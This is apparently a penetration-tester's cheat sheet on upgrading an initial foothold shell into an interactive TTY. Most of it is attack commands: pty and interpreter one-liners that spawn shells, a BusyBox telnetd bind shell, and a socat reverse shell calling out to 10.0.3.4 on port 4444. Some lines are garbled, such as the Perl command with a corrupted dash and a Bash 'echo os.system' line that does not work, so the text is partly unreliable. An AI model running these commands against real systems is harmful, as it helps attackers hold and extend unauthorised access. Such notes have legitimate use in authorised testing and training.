# Spawning TTY Shell

After getting intial shell, the next step will be to "upgrading" shell into a fully interactive TTY so we can features such as interactive commands (such as su and ssh), text editors, tab complete, job control and more.

The quick win command using Python pty module:

```
python -c 'import pty;pty.spawn("/bin/bash")'
```

Then, set PATH and TERM if they are missing (allow also to acsses other bins):

```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
export TERM=xterm
export SHELL=bash
```

## Others ways to spawn TTY shell

Use the following methods if Python not found on the target / not supported.

Bash:

```
echo os.system('/bin/bash')
/bin/sh -i
```

Perl:

```
perl â€”e 'exec "/bin/sh";'
perl: exec "/bin/sh";
```

Ruby console:

```
 exec "/bin/sh"
```
Lua console:

```
os.execute('/bin/sh')
```
Vi:

```
:!bash
:set shell=/bin/bash:shell
```

BusyBox:

```
/bin/busybox telnetd -|/bin/sh -p9999
```

Socat (altrenate to netcat):

```
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444  
```

If Socat not installed, there are standalone binaries that can be downloaded from this Github repo: https://github.com/andrew-d/static-binaries
